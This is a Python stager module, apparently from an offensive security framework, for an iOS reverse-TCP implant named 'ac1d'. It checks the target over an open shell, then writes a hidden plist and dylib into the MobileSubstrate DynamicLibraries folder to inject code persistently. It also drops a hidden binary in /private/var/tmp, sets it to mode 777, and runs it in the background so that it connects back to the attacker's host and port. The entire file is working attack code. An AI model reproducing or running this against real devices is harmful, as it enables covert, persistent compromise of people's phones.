#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import time

from core.badges import badges
from core.exceptions import exceptions
from core.helper import helper

from data.modules.exploit.ios.stager.ac1d_reverse_tcp.core.terminator import terminator

class stages:
    def __init__(self, local_host, local_port, client):
        self.local_host = local_host
        self.local_port = local_port
        self.client = client
        self.badges = badges()
        self.helper = helper()
        self.terminator = terminator()
        self.exceptions = exceptions()

        self.first_stage = "uname -sp"
        self.first_stage_size = self.helper.len_line(self.first_stage)

        self.second_stage = "data/exploit/ios/stager/ac1d_reverse_tcp/bin/ac1d.plist"
        self.second_stage_size = self.helper.len_file(self.second_stage)
        self.second_stage_path = "/Library/MobileSubstrate/DynamicLibraries/.ac1d.plist"

        self.third_stage = "data/exploit/ios/stager/ac1d_reverse_tcp/bin/ac1d.dylib"
        self.third_stage_size = self.helper.len_file(self.third_stage)
        self.third_stage_path = "Library/MobileSubstrate/DynamicLibraries/.ac1d.dylib"

        self.forth_stage = "data/exploit/ios/stager/ac1d_reverse_tcp/bin/ac1d"
        self.forth_stage_size = self.helper.len_file(self.forth_stage)
        self.forth_stage_path = "/private/var/tmp/.ac1d"

    def send_first_stage(self):
        self.badges.output_process("Sending first stage...")
        self.client.send((self.first_stage + "\n").encode())
        self.badges.output_process("Executing first stage...")
        device_os, device_arch = self.client.recv(100).decode().strip().split()
        if device_os != "Darwin" and device_arch not in ['arm64', 'arm', 'armv7']:
            self.badges.output_error("Failed to execute first stage!")
            raise self.exceptions.GlobalException

    def send_second_stage(self):
        self.badges.output_process("Sending second stage...")
        if os.path.exists(self.second_stage):
            second_stage_file = open(self.second_stage, "rb")
            executable = second_stage_file.read()
            second_stage_file.close()
            instructions = ""
            instructions += f"cat >{self.second_stage_path}"
            instructions += "\n"
        else:
            self.badges.output_error("Failed to send second stage!")
            raise self.exceptions.GlobalException
        self.badges.output_process("Executing second stage...")
        self.client.send(instructions.encode())
        self.client.send(executable)

    def send_third_stage(self):
        self.badges.output_process("Sending third stage...")
        if os.path.exists(self.third_stage):
            third_stage_file = open(self.third_stage, "rb")
            executable = third_stage_file.read()
            third_stage_file.close()
            instructions = ""
            instructions += f"cat >{self.third_stage_path}"
            instructions += "\n"
        else:
            self.badges.output_error("Failed to send third stage!")
            raise self.exceptions.GlobalException
        self.badges.output_process("Executing third stage...")
        self.client.send(instructions.encode())
        self.client.send(executable)

    def send_forth_stage(self):
        self.badges.output_process("Sending forth stage...")
        if os.path.exists(self.forth_stage):
            forth_stage_file = open(self.forth_stage, "rb")
            executable = forth_stage_file.read()
            forth_stage_file.close()
            instructions = ""
            instructions += f"cat >{self.forth_stage_path};"
            instructions += f"chmod 777 {self.forth_stage_path};"
            instructions += f"sh -c '{self.forth_stage_path} {self.terminator.encode_remote_data(self.local_host, self.local_port)}' 2>/dev/null &"
            instructions += "\n"
        else:
            self.badges.output_error("Failed to send forth stage!")
            raise self.exceptions.GlobalException
        self.badges.output_process("Executing forth stage...")
        self.client.send(instructions.encode())
        self.client.send(executable)
        #self.client.send("killall SpringBoard\n")
        self.client.close()